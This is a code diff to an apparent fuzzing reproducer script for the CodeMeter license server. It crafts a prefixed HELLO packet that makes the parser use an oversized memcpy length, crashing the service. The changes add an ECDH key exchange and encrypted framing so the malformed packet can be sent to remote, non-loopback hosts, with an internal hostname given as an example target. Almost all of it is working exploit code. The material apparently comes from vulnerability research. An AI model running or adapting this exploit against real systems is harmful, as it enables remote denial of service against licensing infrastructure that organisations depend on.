@@ -11,6 +11,9 @@ plaintext is:
 
     5e 35 5e d6 f2 || canonical HELLO with a fresh 4-byte client token
 
+For non-loopback targets, it first completes the ECDH selector exchange and
+sends the same application plaintext under selector 0xa1.
+
 That shifted HELLO makes the parser see 0x28000010 at cleartext offset 0x0c,
 which is the value observed as the later memcpy length at CodeMeterLin+0x8f431d.
 """
@@ -26,6 +29,8 @@ import struct
 import time
 import zlib
 
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
 
@@ -35,6 +40,7 @@ EXPECTED_BAD_LEN = 0x28000010
 HELLO_LEN = 184
 HELLO_TOKEN_OFFSET = 28
 HELLO_TOKEN_LEN = 4
+SAMC_HEADER_TAIL = bytes([0x11, 0, 1, 0, 0, 0, 0, 0])
 
 # Non-token bytes observed in the captured canonical HELLO plaintext. Everything
 # else in the 184-byte HELLO is zero. Avoid assigning protocol names where the
@@ -94,6 +100,117 @@ def encrypt_c2d_frame(plaintext: bytes, t: int) -> bytes:
         + bytes([0x11, 0, 1, 0, 0, 0, 0, 0])
     )
     return header + body
+
+
+def is_loopback_target(host: str) -> bool:
+    """Best-effort check used only to choose default channel/oracle behavior."""
+    return host in {"127.0.0.1", "::1", "localhost"}
+
+
+def resolve_channel(channel: str, host: str) -> str:
+    if channel != "auto":
+        return channel
+    return "psk" if is_loopback_target(host) else "ecdh"
+
+
+def recv_exact(sock: socket.socket, n: int, timeout: float) -> bytes:
+    sock.settimeout(timeout)
+    chunks = bytearray()
+    while len(chunks) < n:
+        try:
+            chunk = sock.recv(n - len(chunks))
+        except (ConnectionResetError, BrokenPipeError, socket.timeout, OSError):
+            break
+        if not chunk:
+            break
+        chunks.extend(chunk)
+    return bytes(chunks)
+
+
+def send_samc_payload(sock: socket.socket, payload: bytes) -> None:
+    """Send one outer samc envelope with the provided selector/cipher payload."""
+    header = b"samc" + struct.pack("<I", len(payload)) + SAMC_HEADER_TAIL
+    sock.sendall(header + payload)
+
+
+def recv_samc_payload(sock: socket.socket, timeout: float) -> bytes | None:
+    hdr = recv_exact(sock, 16, timeout)
+    if len(hdr) != 16 or hdr[:4] != b"samc":
+        return None
+    body_len = struct.unpack_from("<I", hdr, 4)[0]
+    if body_len > 1 << 24:
+        return None
+    body = recv_exact(sock, body_len, timeout)
+    if len(body) != body_len:
+        return None
+    return body
+
+
+def derive_ecdh_key_iv(shared: bytes) -> tuple[bytes, bytes]:
+    digest = hashlib.sha256(shared + b"\x00\x00\x00\x01").digest()
+    return digest[:16], digest[16:32]
+
+
+def do_ecdh_handshake(sock: socket.socket, timeout: float) -> tuple[bytes, bytes, bytes]:
+    """Run the remote-accepted ECDH selector exchange and return key/iv."""
+    private_key = ec.generate_private_key(ec.SECP224R1(), default_backend())
+    public_numbers = private_key.public_key().public_numbers()
+    client_point = (
+        b"\x04"
+        + public_numbers.x.to_bytes(28, "big")
+        + public_numbers.y.to_bytes(28, "big")
+    )
+
+    send_samc_payload(sock, b"\xa2\x05" + client_point)
+    response = recv_samc_payload(sock, timeout)
+    if response is None:
+        raise ConnectionError("no ECDH response")
+    if len(response) < 65:
+        raise ConnectionError(f"short ECDH response: {len(response)} bytes")
+    if response[8] != 0x04:
+        raise ConnectionError(f"unexpected ECDH point marker: 0x{response[8]:02x}")
+
+    server_x = int.from_bytes(response[9:37], "big")
+    server_y = int.from_bytes(response[37:65], "big")
+    server_public = ec.EllipticCurvePublicNumbers(
+        server_x, server_y, ec.SECP224R1(),
+    ).public_key(default_backend())
+    shared = private_key.exchange(ec.ECDH(), server_public)
+    key, iv = derive_ecdh_key_iv(shared)
+    return key, iv, response
+
+
+def build_ecdh_mac_suffix(plaintext: bytes) -> bytes:
+    """Append the ECDH-channel padded length/CRC tail."""
+    aligned = ((len(plaintext) + 16) + 15) & ~15
+    if aligned < 32:
+        aligned = 32
+    pad_len = aligned - len(plaintext) - 8
+    body = plaintext + (b"\x00" * pad_len) + struct.pack("<I", len(plaintext))
+    return body + struct.pack("<I", zlib.crc32(body) & 0xFFFFFFFF)
+
+
+def encrypt_ecdh_payload(plaintext: bytes, key: bytes, iv: bytes) -> bytes:
+    full_plaintext = build_ecdh_mac_suffix(plaintext)
+    encryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
+    ciphertext = encryptor.update(full_plaintext) + encryptor.finalize()
+    return b"\xa1" + cts_shuffle(ciphertext)
+
+
+def decrypt_ecdh_response(payload: bytes | None, key: bytes, iv: bytes) -> bytes | None:
+    if payload is None or len(payload) < 16 or len(payload) % 16 != 0:
+        return None
+    decryptor = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
+    plaintext = decryptor.update(cts_shuffle(payload)) + decryptor.finalize()
+    if len(plaintext) < 8:
+        return None
+    data_len = struct.unpack_from("<I", plaintext, len(plaintext) - 8)[0]
+    crc = struct.unpack_from("<I", plaintext, len(plaintext) - 4)[0]
+    if data_len > len(plaintext) - 8:
+        return None
+    if (zlib.crc32(plaintext[:-4]) & 0xFFFFFFFF) != crc:
+        return None
+    return plaintext[:data_len]
 
 
 def validate_hello_shape(hello: bytes) -> None:
@@ -181,9 +298,19 @@ def send_one(host: str, port: int, wire: bytes, timeout: float) -> None:
         sock.sendall(wire)
 
 
-def print_packet_summary(prefix: bytes, token: bytes, payload: bytes, wire: bytes) -> None:
+def print_packet_summary(
+    prefix: bytes,
+    token: bytes,
+    payload: bytes,
+    *,
+    channel: str,
+    target: str,
+    application_wire_len: int,
+) -> None:
     words = u32_words(payload, 4)
     print("=== packet ===")
+    print(f"target={target}")
+    print(f"channel={channel}")
     print(f"prefix_hex={prefix.hex()}")
     print(f"fresh_client_token={token.hex()}")
     print(f"canonical_hello_len={HELLO_LEN}")
@@ -193,7 +320,7 @@ def print_packet_summary(prefix: bytes, token: bytes, payload: bytes, wire: byte
     if len(words) >= 4:
         print(f"word_at_cleartext_offset_0x0c=0x{words[3]:08x}")
         print(f"matches_expected_bad_len={words[3] == EXPECTED_BAD_LEN}")
-    print(f"wire_len={len(wire)}")
+    print(f"application_wire_len={application_wire_len}")
     print()
 
 
@@ -206,13 +333,17 @@ Examples:
   python3 fuzzer/repro_prefixed_hello_standalone.py --dry-run
   python3 fuzzer/repro_prefixed_hello_standalone.py
   python3 fuzzer/repro_prefixed_hello_standalone.py --host 127.0.0.1 --port 22350
+  python3 fuzzer/repro_prefixed_hello_standalone.py --host vistrrdslin0004.vi.vector.int
 """,
     )
     parser.add_argument("--host", default="127.0.0.1")
     parser.add_argument("--port", type=int, default=22350)
+    parser.add_argument("--channel", choices=["auto", "psk", "ecdh"], default="auto",
+                        help="crypto channel: auto uses PSK for loopback, ECDH otherwise")
     parser.add_argument("--prefix", default=DEFAULT_PREFIX_HEX,
                         help="hex bytes to prepend before the canonical HELLO")
     parser.add_argument("--connect-timeout", type=float, default=2.0)
+    parser.add_argument("--socket-timeout", type=float, default=2.0)
     parser.add_argument("--wait", type=float, default=10.0,
                         help="seconds to wait for PID/core crash evidence after send")
     parser.add_argument("--dry-run", action="store_true",
@@ -220,6 +351,7 @@ Examples:
     parser.add_argument("--no-crash-oracle", action="store_true",
                         help="do not inspect /proc or coredump directories")
     args = parser.parse_args()
+    channel = resolve_channel(args.channel, args.host)
 
     prefix = bytes.fromhex(args.prefix)
     if not prefix:
@@ -228,27 +360,72 @@ Examples:
     hello, token = fresh_hello()
     payload = prefix + hello
     validate_default_crash_layout(prefix, payload)
-    wire = encrypt_c2d_frame(payload, int(time.time()))
-    print_packet_summary(prefix, token, payload, wire)
+
+    if channel == "psk":
+        wire = encrypt_c2d_frame(payload, int(time.time()))
+        application_wire_len = len(wire)
+    elif channel == "ecdh":
+        wire = None
+        application_wire_len = 16 + 1 + len(build_ecdh_mac_suffix(payload))
+    else:
+        raise AssertionError(f"unexpected channel: {channel}")
+
+    print_packet_summary(
+        prefix,
+        token,
+        payload,
+        channel=channel,
+        target=f"{args.host}:{args.port}",
+        application_wire_len=application_wire_len,
+    )
 
     if args.dry_run:
         print("dry_run=True")
         return 0
 
-    before_pid = None if args.no_crash_oracle else codemeter_pid_from_proc()
-    before_core = None if args.no_crash_oracle else newest_core()
+    local_crash_oracle = not args.no_crash_oracle and is_loopback_target(args.host)
+    before_pid = codemeter_pid_from_proc() if local_crash_oracle else None
+    before_core = newest_core() if local_crash_oracle else None
 
     print("=== baseline ===")
+    print(f"local_crash_oracle={local_crash_oracle}")
     print(f"before_pid={before_pid}")
     print(f"before_core={before_core}")
     print()
 
     print("=== send ===")
     print(f"target={args.host}:{args.port}")
-    send_one(args.host, args.port, wire, args.connect_timeout)
+    if channel == "psk":
+        if wire is None:
+            raise AssertionError("missing PSK wire frame")
+        print("selector=0xa0")
+        send_one(args.host, args.port, wire, args.connect_timeout)
+    elif channel == "ecdh":
+        print("selector=0xa1")
+        with socket.create_connection((args.host, args.port), timeout=args.connect_timeout) as sock:
+            sock.settimeout(args.socket_timeout)
+            key, iv, ecdh_response = do_ecdh_handshake(sock, args.socket_timeout)
+            ecdh_payload = encrypt_ecdh_payload(payload, key, iv)
+            print(f"server_point={ecdh_response[8:65].hex()}")
+            print(f"key={key.hex()}")
+            print(f"iv={iv.hex()}")
+            print(f"encrypted_payload_len={len(ecdh_payload)}")
+            send_samc_payload(sock, ecdh_payload)
+            response_payload = recv_samc_payload(sock, args.socket_timeout)
+            response_inner = decrypt_ecdh_response(response_payload, key, iv)
+            print(f"response_payload_len={None if response_payload is None else len(response_payload)}")
+            print(f"response_inner_len={None if response_inner is None else len(response_inner)}")
+            if response_inner is not None:
+                print(f"response_inner_head={response_inner[:64].hex()}")
+    else:
+        raise AssertionError(f"unexpected channel: {channel}")
     print("sent=True")
 
-    if args.no_crash_oracle:
+    if not local_crash_oracle:
+        print()
+        print("=== crash oracle ===")
+        print("local_crash_oracle=False")
+        print("No local PID/core check was run for this target.")
         return 0
 
     deadline = time.time() + args.wait
